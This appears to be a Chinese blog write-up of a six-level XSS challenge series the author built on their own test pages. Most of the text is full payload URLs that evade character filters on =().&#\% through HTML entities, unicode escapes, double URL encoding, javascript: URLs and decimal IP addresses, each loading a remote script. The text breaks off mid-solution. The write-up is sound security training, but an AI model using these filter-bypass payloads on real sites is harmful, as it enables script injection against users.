xss 修炼之-独孤九剑
香草 2020-05-31 共 170 人围观 WEB 安全编辑
缘起
群里某个同学在 xss 实战中遇到了一个地方过滤了 =() 问我怎么办？
当然这个问题很简单，我很快在脑海里想出了好几种方法。当时我当时就像着魔似的问
自己如果同时过滤 =(). 又怎么办呢？
很快又有了办法，如果同时又过滤了 =().%呢？
同时过滤 =().&#\ 呢？
…..
于是便有了这次 《xss 修炼之-独孤九剑》
我先出了第一题，也就是那个同学遇到的场景，当然每道题出来的时候我肯定需要先完
成，出题之前我也是没把握的。
独孤九剑-第一式
过滤了 =()，少侠骨骼惊奇，必是练武奇才
要求加载任意 JS 代码,成功加载 http://xcao.vip/xss/alert.js 表示完成挑战
">
http://xcao.vip/test/xss1.php?data=1
当时我想到的解法是
独孤九剑第一式：
这里过滤了 =()
http://xcao.vip/test/xss1.php?data=%22%3E%3Csvg%3E%3Cscript%3E%26%23x65%3B%26%2
3x76%3B%26%23x61%3B%26%23x6c%3B%26%23x28%3B%26%23x6c%3B%26%23x6f%3B%26%23x63%3
B%26%23x61%3B%26%23x74%3B%26%23x69%3B%26%23x6f%3B%26%23x6e%3B%26%23x2e%3B%26%23
x68%3B%26%23x61%3B%26%23x73%3B%26%23x68%3B%26%23x2e%3B%26%23x73%3B%26%23x6c%3B%
26%23x69%3B%26%23x63%3B%26%23x65%3B%26%23x28%3B%26%23x31%3B%26%23x29%3B%26%23x2
9%3B%3C/script%3E%3C/svg%3E#with(document)body.appendChild(createElement('scrip
t')).src='http://xcao.vip/test/alert.js'
解码后就是这样，这里是因为在 svg 下面的 script 可以使用 html 编码，利用 html 编码绕过=()
的过滤
http://xcao.vip/test/xss1.php?data=">#with
(document)body.appendChild(createElement('script')).src='http://127.0.0.1/xss/a
lert.js'
独孤九剑第二式：
这里过滤了 =(). 新增了.的过滤
利用 setTimeout 以及``代替括号，同时采用\u 编码绕过对()和.的限制
http://xcao.vip/test/xss2.php?data=xxx%22%3E%3Cscript%3EsetTimeout`\u0065\u0076
\u0061\u006c\u0028\u006c\u006f\u0063\u0061\u0074\u0069\u006f\u006e\u002e\u0068\
u0061\u0073\u0068\u002e\u0073\u006c\u0069\u0063\u0065\u0028\u0031\u0029\u0029
`;%3C/script%3E#with(document)body.appendChild(createElement('script')).src='ht
tp://xcao.vip/xss/alert.js'
其实第一题和第二题完全可以合成一个题，因为我当时想到的第一个解法是需要用到.
号的所以就保留了下来。
既然第一式和第二式用到了 & # \ 那我把它干掉，为了补偿把 = 还给你，你能怎样
于是有了
独孤九剑第三式：
过滤了 ().&#\ 注意和第二题的不同，放开了=的过滤，新增了&#\的过滤
内心的想法，过滤了&#\ 那么第一和第二种解法都不适用了，怎么办？
还好没有过滤=了，我是不是可以直接用 script 加载，然后利用%2e URL 编码绕过对点号的过滤呢？
http://xcao.vip/test/xss3.php?data=%22%3E%3Cscript%20src=http://xcao%252evip/xs
s/alert%252ejs%3E%3C/script%3E
既然三种方法都可以绕过，那我把三者的过滤规则中和一下，你就没办法了吧？嘿嘿嘿
于是有了
独孤九剑第四式：
过滤了 =().&#\
这题我思考了很久，我甚至一度认为这样没法利用了，原来独孤九剑只有四式……
受到第三式的启发，其他不能用但是我们%编码还能用啊！（事实证明，我自己把我自己带坑里了）
带着这个思路，最后我想到了一个 javascript 伪协议+URL 编码的方法
使用 location.replace 方法引入 javascript 协议，由于 location.replace 里面的参数是连接，
里面必然可以使用 URL 编码，因此顺利绕过
把().分别用 %2528 %2529 %252e 编码，因为 location 是 URL,因此后自动解码 URL 编码。
http://xcao.vip/test/xss4.php?data=%22%3E%3Cscript%3Elocation[%27replace%27]`ja
vascript:eval%2528eval%2528location%252ehash%252eslice%25281%2529%2529%2529`%3C
/script%3E#with(document)body.appendChild(createElement(/script/.source)).src='
http://xcao.vip/xss/alert.js'
解码后
http://xcao.vip/test/xss4.php?data=">#with(document)body.ap
pendChild(createElement(/script/.source)).src='http://xcao.vip/xss/alert.js'
既然四种方法都可以绕过，而且还用到%编码，那我把%过滤了吧，你就没办法了吧？
嘿嘿嘿嘿
但是转念一想，要是真的过滤的完不成了怎么办？那我作为补偿开放=的过滤吧。
于是有了
独孤九剑第五式：
过滤了 ().&#\% 这里和第四题的区别是新增了%的过滤，同时不再过滤=
因为和第三题比较只是多了一个%的过滤，因此沿用第三题的思路
这里想到了一个 IP 十进制的方法，把 IP 地址转换成十进制不就没.了吗。
alert.js 好处理，可以用自己的一个域名跳转到目标域名，自己域名链接不要带.就行
http://xcao.vip/test/xss5.php?data=%22%3E%3Cscript%20src=http://2067398186/xxx%
3E%3C/script%3E
顺利练成第五式，决定挑战一下难度，如果我中和上面的过滤，你就没办法了吧？嘿嘿
嘿嘿嘿
于是有了
独孤九剑第六式：
过滤了 =().&#\% 少侠你已经堪称江湖一流高手，武学无止境
做这道题的时候我遇到了一个 es6 js 模板语法的坑，导致我迟迟不能突破，这个后面细说
因此只好选择了一个 笨办法 利用 window.write 写入 html，但是大家都知道直接从 hash 里面取
出的值是 html 实体编码了的
于是我只好在前面自己构造了一个<img (由于思维定式，我很执着的要用 hash 来保存攻击变量，b
ase64 他不香吗，这里走了不少弯路)
http://xcao.vip/test/xss6.php/?data=%22%3E%3Cscript%3Edocument[%27write%27]`%3C
img%20${location[%27hash%27][%27slice%27]`1`}`%3C/script%3E#/src='x'onerror=wit
h(document)body.appendChild(createElement('script')).src='http://xcao.vip/test/
alert.js'//
解码后